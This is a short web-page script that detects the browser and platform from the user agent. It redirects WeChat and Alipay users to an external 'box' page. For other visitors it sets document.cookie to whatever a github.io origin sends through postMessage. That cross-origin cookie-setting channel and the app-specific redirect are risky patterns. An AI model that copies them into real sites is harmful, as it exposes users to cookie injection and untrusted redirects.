    <script>
        //安卓、苹果回调
        const ua = window.navigator.userAgent.toLowerCase()
        console.log('ua',ua)
        // ios平台
        const isIos = (() => {
            return /iPhone|iPod|iPad/i.test(ua)
        })()
        // android平台
        const isAndroid = (() => {
            return /Android|Adr/i.test(ua)
        })()
        // 微信生态
        const isWechat = (() => {
            return /MicroMessenger/i.test(ua)
        })()
        // 支付宝
        const isAlipay = (()=> {
            return /AlipayClient/i.test(ua)
        })()
        //抖音
        const isDouYin = (()=> {
            return /aweme/i.test(ua)
        })()
        if(isWechat || isAlipay) {
            window.location.href = 'https://play.pgp1024.com/p/box2023010400004'
        }else {
            window.addEventListener('message', function(event) {
                console.log('event',event)
                if (event.origin === 'https://midnatm.github.io' && event.data.type === 'set-cookie') {
                    document.cookie = event.data.data;
                }
            }, false);
        }
    </script>
